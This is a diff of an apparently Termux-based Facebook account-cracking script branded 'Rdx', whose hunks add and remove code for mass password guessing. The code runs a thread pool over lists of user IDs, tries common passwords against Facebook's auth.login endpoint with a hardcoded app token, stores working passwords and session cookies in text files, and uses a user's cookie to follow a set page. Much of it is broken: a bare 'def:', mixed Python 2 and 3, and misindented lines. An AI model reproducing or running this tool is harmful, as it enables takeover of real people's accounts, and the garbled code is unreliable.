@@ -62,53 +62,6 @@ def cetak(b):
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
 
-def ud():
-    os.system('clear')
-    jalan(logo)
-    opt = input('\n   CHOOSE OPTION >>>\033[1;37m ')
-    if opt == '1':
-        os.system('xdg-open https://youtube.com/channel/UCqmAeJg_2YaF9q_zFIxwSlQ')
-        FD()
-        return None
-    None('\n\x1b[1;31mEXIT\x1b[0;97m')
-
-
-def FD():
-    os.system('clear')
-    print(logo)
-    print('\x1b[1;33m [1] FOLLOW THIS MY FACEBOOK PAGE')
-    print(' [2] EXIT')
-    opt = input('\n  \x1b[1;32m CHOOSE OPTION >>> ')
-    if opt == '1':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100075160338795')
-        o()
-        return None
-    None('\n\x1b[1;31mEXIT\x1b[0;97m')
-    
-import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("git pull")
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-try:
-    import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-
-    def follow(self, session, coki):
-        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://free.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
 
 def jalan(z):
 	for e in z + '\n':
@@ -124,33 +77,6 @@ W='\033[1;95m'
 S='\033[1;93m'
 P='\033[1;92m'
 Y='\033[1;96m'
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-A = '\x1b[1;90m' # WARNA ABU ABU
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
 #Dev:Rdx
 ##### LOGO #####
 logo = """
@@ -10688,12 +10614,6 @@ jalan("\033[1;93m ▇▇\033[1;92m            Tool Update EveryDay      \033[1;9
 jalan("\033[1;93m ▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93m ▇▇")
 jalan("\033[1;93m ▇▇\033[1;92m         Facebook Id -- Rdx       \033[1;93m              ▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-tl = str(len(user))
-print('\033[1;36m TOTAL IDS: '+tl)
-print('\033[1;36m THE PROCESS HAS BEEN STARTED')
-print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
-print('\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-  
 print "\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»"
 CorrectUsername = "Rdx"
 CorrectPassword = "Rdx"
@@ -10713,26 +10633,7 @@ while (loop == 'true'):
     else:
         print "\033[1;97mWrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
-def:
-    with ThreadPool(max_workers=50) as manshera:
-        clear()
-        tl = str(len(user))
-        print('\033[1;36m TOTAL IDS: '+tl)
-        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
-        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 5 MIN ')
-        print('\033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-        for love in user:
-            pwx = [love[1:]]
-            uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-            manshera.submit(rcrack,uid,pwx,tl)
-    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-    print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
-    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 
-def rcrack(uid,pwx,tl):
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -11334,7 +11235,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;97m[+] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m«-----------------\033[1;97mRDX\033[1;97m---------------»"
+		print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
@@ -14671,14 +14572,18 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[live  ok]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+				print '\x1b[1;92m[ⓇDX-OK]x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;97m[Error CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
+					coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+					print '\033[1;97m[ⓇDX-CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
 					cps.close()
@@ -14701,31 +14606,23 @@ def action():
 #					        cps.close()
 #					        cpb.append(c+user+pass2)
 																	
-															
-		     if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('    \033[1;32m[ⓇDX-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/ⓇDX-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print('    \33[1;30m[ⓇDX-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ⓇDX-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
-                break
+							 break
             else:
                 continue
         loop+=1
         sys.stdout.write(' %s[ⓇDX-] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
-    except:
-        pass
-
+															
+		except:
+			pass
 		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 44*'-'
+	print '[✓] Process Has Been Completed ....'
+	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
+	print """
 \033[1;91m     ♦♦♦———————————————————————————————♦♦♦
 \033[1;91m ,------. ,------. ,--.   ,--. 
 \033[1;91m |  .--. '|  .-.  \ \  `.'  /  
